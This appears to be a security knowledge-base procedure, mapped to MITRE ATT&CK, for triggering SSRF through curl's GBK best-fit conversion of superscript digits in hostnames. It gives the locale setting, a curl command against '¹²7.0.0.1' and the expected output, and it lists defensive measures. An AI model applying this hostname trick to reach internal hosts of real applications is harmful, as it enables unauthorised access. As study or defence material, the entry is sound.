---
id: proc-uuid-003
tags:
  - ssrf
  - curl
  - execution
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-gbk-ssrf-test]]'
verified: false
platforms:
  - Linux
  - macOS
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:02.505Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-Curl-with-Crafted-URL

## Summary

Executes curl with a crafted URL on a Chinese-localized system to trigger SSRF via GBK best-fit hostname conversion.

## Description

With LANG set to zh_CN, curl converts superscript characters in the hostname to digits, resolving '¹²7.0.0.1' to 127.0.0.1 and sending the request internally.

## Requirements

1. curl installed (v8.7.1 or below, IDN enabled)
2. System locale set to Chinese (e.g., export LANG=zh_CN.UTF-8)
3. Local server running on port 80

## Defense

Defensive measures and detection strategies:

- Validate hostnames strictly in ASCII
- Log and alert on non-ASCII URLs in curl invocations
- Update curl to patched versions

## Objectives

1. Demonstrate hostname parsing flaw
2. Redirect request to internal host
3. Enable SSRF or RCE in apps

## Instructions

### Step 1: Set Locale

**Context**: Enable GBK mapping.

```bash
export LANG=zh_CN.UTF-8
```

### Step 2: Run Curl Command

**Context**: Trigger the request using [[commands/curl-gbk-ssrf-test]].

```bash
curl -g 'http://¹²7.0.0.1' -v -o /dev/null
```

> Disables globbing (-g), shows verbose details (-v), discards output (-o).

**Expected Output**: Logs like '* Connected to 127.0.0.1 (127.0.0.1) port 80' and '< HTTP/1.1 200 OK' with 'FindVuln'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-gbk-ssrf-test]]

## Tools Used

- [[tools/curl]]

## Tags

- [[ssrf]]
- [[tools/curl]]
